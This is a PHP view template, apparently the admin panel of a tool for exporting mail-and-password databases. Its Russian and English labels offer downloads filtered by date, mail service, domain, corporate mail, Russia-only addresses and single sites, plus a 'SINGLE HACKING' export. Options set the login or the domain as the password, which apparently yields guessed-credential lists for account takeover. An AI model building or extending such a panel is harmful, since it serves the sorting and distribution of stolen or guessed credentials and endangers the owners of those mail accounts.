<!-- START CONTENT -->
<div id="content">
<ul class="page-nav fl">

<li class="active" ><?=$html->link('Sample',array('action'=>'rendview')); ?></li>

<!--
<li><?=$html->link('База сайтов (mail password)',array('action'=>'rendview')); ?></li>
<li><?=$html->link('База сайтов (only mail) ',array('action'=>'rendview2')); ?></li>
-->

<li><?=$html->link('txt (mail password)',array('action'=>'download_domens')); ?></li>
<li><?=$html->link('txt (only mail) ',array('action'=>'download_domens2')); ?></li>
<li><?=$html->link('txt (SINGLE HACKING) ',array('action'=>'download_domens3')); ?></li>
</ul>

<div class="clear"></div>

<?

echo '<table class="table no-nowrap" border="1">';
echo "<tbody><tr style='color:black'>";
echo "<FORM ACTION='/posts/domens/' METHOD='POST'>";
echo "<td> Date only password table <select name='sdate'>";

foreach($data['sdate'] as $key =>$d)
{
$date = $d['mails']['date'];
if($date == $data['sdate1']){
echo "<option selected value='$date'>$date</option>";
}else {
echo "<option value='$date'>$date</option>";
}
}
echo "</select>";
echo "<select name='podate'>";
foreach($data['podate'] as $key =>$d)
{
//print_r($d);
$date = $d['mails']['date'];

if($date == $data['podate1']){
echo "<option selected value='$date'>$date</option>";
}else {
echo "<option value='$date'>$date</option>";
}
}
echo "	<label for='podate'>Date</label>";
echo "</select>";
echo "  Date only mail without passwords";
echo "<FORM ACTION='/posts/domens/' METHOD='POST'>";
echo "<select name='sdate_one'>";

	foreach($data['sdate_one'] as $key =>$d)
	{
		$date_one = $d['mails_one']['date'];
		
		
		if($date == $data['sdate1_one']){
			echo "<option selected value='$date_one'>$date_one</option>";
		}else {
			echo "<option value='$date_one'>$date_one</option>";
		}
		
		
	}

echo "</select>";


echo "<select name='podate_one'>";
	foreach($data['podate_one'] as $key =>$d)
	{
		//print_r($d);
		$date_one = $d['mails_one']['date'];
		
		if($date == $data['podate1_one']){
			echo "<option selected value='$date_one'>$date_one</option>";
		}else {
			echo "<option value='$date_one'>$date_one</option>";
		}
		
	}
echo "	<label for='podate_one'>Дата по чисто мылам</label>";
echo "</select>";



//////////////////////////	


echo "<td><select name='type'>";
echo "<option value='countNoHash' selected >countNoHash</option>";
echo "<option value='countHash'>countHash</option>";
echo "<option value='countPass'>countPass</option>";
echo "<option value='countMail' >countMail</option>";
echo "</select></td></tr>";

echo "<tr style='color:black'>";
echo "<td><input type='text' name='domen' value=''>";
echo "<label for=\"domen\">Post service</label></td>";
echo "<td><input type='submit' name='down' value='donwload'></td>";
echo '</tr>';


echo "<tr style='color:black'>";
echo "<td><input type='text' name='zona' value=''>";
echo "<label for=\"zona\">Domain (Select to All *)</label> Exclude Domain<input type='text' name='zona_meiler' value='mail.ru'>";
echo "<td><input type='submit' name='down2' value='donwload'></td>";
echo '</tr>';


echo "<tr style='color:black'>";
echo "<td><input type='text' name='corp_big' value=''>";
echo "<br><input type='checkbox' name='dom_pass' value='ku' />Set login as password (Only NoHash & corp)<br>";
echo "<input type='checkbox' name='dom_pass2' value='ku2' />Set domain as passwofd  (Only NoHash & corp)<br>";
echo "<label for=\"corp_big_one\">(Select corporate mail with passwords) Input corp or sred or big</label></td>";
echo "<td><input type='submit' name='down3' value='donwload'></td>";
echo '</tr>';


echo "<tr style='color:black'>";
echo "<td><input type='text' name='corp_big_one' value=''>";
echo "<br><input type='checkbox' name='dom_pass_one' value='ku_one' />Set login as password, only corp<br>";
echo "<input type='checkbox' name='dom_pass2_one' value='ku2_one' />Set domain as password, only corp)<br>";
echo "<label for=\"corp_big_one\">(Select corporate mail without passwords) Input corp or sred</label></td>";
echo "<td><input type='submit' name='down4' value='donwload'></td>";
echo '</tr>';



echo "<tr style='color:black'>";
echo "<td><input type='text' name='ru_emails' value='corp'>";
echo "<label for=\"corp_big_one\">Only Russia(corp or sred) Download mail password</label></td>";
echo "<td><input type='submit' name='down5' value='donwload'></td>";
echo '</tr>';


echo "<tr style='color:black'>";
echo "<td><input type='text' name='ru_emails2' value='corp'>";
echo "<label for=\"corp_big_one2\">Only Russia(corp or sred) Download mail without passwords</label></td>";
echo "<td><input type='submit' name='down6' value='donwload'></td>";
echo '</tr>';


echo "<tr style='color:black'>";
echo "<td><select name='site'>";
echo "<option value=''></option>";

	foreach($data['domens'] as $key =>$d)
	{
		$domen = $d['renders']['domen'];
		
		echo "<option value='$domen'>$domen</option>";
		
	}
echo "</select>";
echo "<label for=\"site\"> sites only mail+password</label></td>";

echo "<td><input type='submit' name='onedomen_one' value='download'></td>";
echo '</tr>';


echo "<tr style='color:black'>";
echo "<td><select name='site_one'>";
echo "<option value=''></option>";

	foreach($data['domens_one'] as $key =>$d)
	{
		$domen_one = $d['renders_one']['domen'];
		
		echo "<option value='$domen_one'>$domen_one</option>";
		
	}
echo "</select>";
echo "<label for=\"site_one\"> sites only mail</label></td>";
echo "<td><input type='submit' name='onedomen_one2' value='download'></td>";
echo '</tr>';

echo "</table>";
?>
</div>